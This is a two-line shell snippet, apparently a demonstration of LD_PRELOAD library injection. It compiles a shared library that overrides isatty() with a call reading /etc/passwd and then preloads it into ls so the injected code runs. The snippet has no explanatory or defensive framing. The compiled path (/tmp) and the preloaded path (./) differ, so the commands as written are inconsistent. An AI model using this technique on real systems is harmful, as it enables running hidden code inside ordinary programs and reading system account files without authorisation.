```sh -cwn
$ echo 'int isatty(int fd) { system("cat /etc/passwd");  return 1; }' | gcc -x c -o /tmp/libmistraleuhpwn.so -shared -
$ LD_PRELOAD=./libmistraleuhpwn.so ls
```


